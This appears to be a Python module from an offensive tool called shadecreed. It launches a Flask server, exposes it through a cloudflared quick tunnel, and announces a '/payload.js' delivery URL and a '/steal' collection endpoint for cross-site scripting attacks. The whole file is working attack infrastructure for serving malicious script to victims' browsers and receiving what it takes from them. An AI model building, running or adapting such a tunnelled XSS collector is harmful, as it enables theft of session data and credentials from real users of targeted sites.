import os,re,sys,json,subprocess,time,signal
from shadecreed.ux.ascii import xssAssist
from shadecreed.ux.anime import wr,wrdel,wrtime,wrcold,wrloader
from shadecreed.core.utils.base import base_dir
class drive:
  def __init__(self,app_path=f'{base_dir}/app/app.py',flask_output=f'{base_dir}/core/middleware/flask.txt',tunnel_path=f'{base_dir}/core/middleware/tunnel.txt',silence_process = False,port=5000):
    self.silence_process = silence_process
    self.app_path = app_path
    self.flask_output = flask_output
    self.tunnel_path = tunnel_path
    self.app = None
    self.tunnel = None
    self.port = port
    self.server_url = None
      
  def start(self):
    try:
      with open(self.flask_output, 'w') as status:
        self.app = subprocess.Popen(['python', self.app_path, '%i'%int(self.port)], stdout=status, stderr=subprocess.STDOUT,text=True)
        wrcold('[+] Dispatch server setup in progress', timeout=5)
        if self.app_status():
          wrcold('[+] Started at PID : %s'% self.app.pid, timeout=2)
          if self.is_installed():
            with open(self.tunnel_path, 'w') as tunneled:
              self.tunnel = subprocess.Popen(['cloudflared','tunnel','--url', '127.0.0.1:%i'%int(self.port)], stdout=tunneled, stderr=subprocess.STDOUT,text=True)
              while True:
                wrcold('[!] Please wait...',co='\x1b[1;31m',timeout=5)
                try:
                  with open(self.tunnel_path, 'r') as pattern:
                    check = pattern.read()[0:]
                    match = re.search(r"https:\/\/[A-Za-z-]+\.trycloudflare\.[c-o]{2,3}", check)
                    self.server_url = match.group()
                    if self.server_url is not None:
                      if 'api.trycloudflare' not in self.server_url:
                        break               
                      else:
                        wr('Failed to request quick tunnel',co='\x1b[1;31m')
                        self.close()
                        break
                    time.sleep(3)
                except Exception:
                  pass
              wr(xssAssist(self.content_delivery()))
              self.process()
          else:
            wr('Missing cloudflared package, see documentation : https://pypi.org/project/shadecreed/',co='\x1b[1;33m')
            self.close()
        else:
          self.close()
    except Exception as error:
      print(error)
      self.close()
        
    
  def app_status(self):
    status = open(self.flask_output, 'r')
    stat = str(status.read())
    if 'Traceback' in stat:
      wrcold('An unexpected was encountered',co='\x1b[1;31m',reverse=True)
      self.close()
    elif not 'Running on all addresses' in stat:
      wrcold('\x1b[1;31m[!] Port %i is already in use\x1b[1;0m'%int(self.port))
      while True:
        try:
          self.port = input('\r[!] Enter a new listening port : ')
          if self.port.lower() == 'q':
            self.close()
          elif len(self.port) == 4 and int(self.port):
            break
        except Exception:
          pass
      self.start()
    else:
      self.process()
      return True
      
  def endpoint(self):
    return f'{self.server_url}/steal'
  
  def content_delivery(self):
    return f'{self.server_url}/payload.js'
    
  def my_imlinux(self):
    if os.name == 'nt':
      return False
    return [1]
  
  def is_installed(self):
    try:
      result = subprocess.run(['cloudflared','--version'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
      output = result.stdout.strip()
      if b'cloudflared' in output:
        return True
    except subprocess.CalledProcessError as e:
      wr(e.stderr)
    except FileNotFoundError:
      return []
 
  def listen(self):
    while True:
      try:
        pass
      except KeyboardInterrupt:
        self.close()
        break
  
  def process(self):
    with open(f'{base_dir}/core/middleware/process.json', 'w') as proc:
      store = {'keep-alive' : True if self.silence_process == True else False}
      json.dump(store, proc,indent=2)
    
  def close(self):
    if self.app:
      if not self.my_imlinux():
        self.app.send_signal(signal.CTRL_BREAK_EVENT)
        if self.tunnel:
          self.tunnel.send_signal(signal.CTRL_BREAK_EVENT)
      else:
        self.app.terminate()
        if self.tunnel:
          self.tunnel.terminate()
 
    
if __name__=='__main__':
  pass